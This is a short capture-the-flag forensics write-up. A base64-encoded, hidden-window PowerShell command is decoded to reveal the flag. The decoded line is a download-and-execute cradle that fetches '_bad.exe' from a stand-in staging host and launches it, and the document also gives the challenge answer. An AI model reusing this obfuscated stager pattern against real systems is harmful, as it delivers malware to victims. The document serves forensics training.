### Problem
```text
While investigating an incident, you identify a suspicious powershell command that was run on a compromised system ... can you figure out what it was doing?

C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe -noP -sta -w 1 -enc TmV3LU9iamVjdCBTeXN0ZW0uTmV0LldlYkNsaWVudCkuRG93bmxvYWRGaWxlKCdodHRwOi8vTWV0YUNURntzdXBlcl9zdXNfc3Q0Z2luZ19zaXRlX2QwdF9jMG19L19iYWQuZXhlJywnYmFkLmV4ZScpO1N0YXJ0LVByb2Nlc3MgJ2JhZC5leGUn
```

### Solution
```bash
┌──(kali㉿kali)-[~/ctf/meta_ctf/forensics]
└─$ echo "TmV3LU9iamVjdCBTeXN0ZW0uTmV0LldlYkNsaWVudCkuRG93bmxvYWRGaWxlKCdodHRwOi8vTWV0YUNURntzdXBlcl9zdXNfc3Q0Z2luZ19zaXRlX2QwdF9jMG19L19iYWQuZXhlJywnYmFkLmV4ZScpO1N0YXJ0LVByb2Nlc3MgJ2JhZC5leGUn"|base64 -d
New-Object System.Net.WebClient).DownloadFile('http://MetaCTF{super_sus_st4ging_site_d0t_c0m}/_bad.exe','bad.exe');Start-Process 'bad.exe'
```

# Flag :- MetaCTF{super_sus_st4ging_site_d0t_c0m}
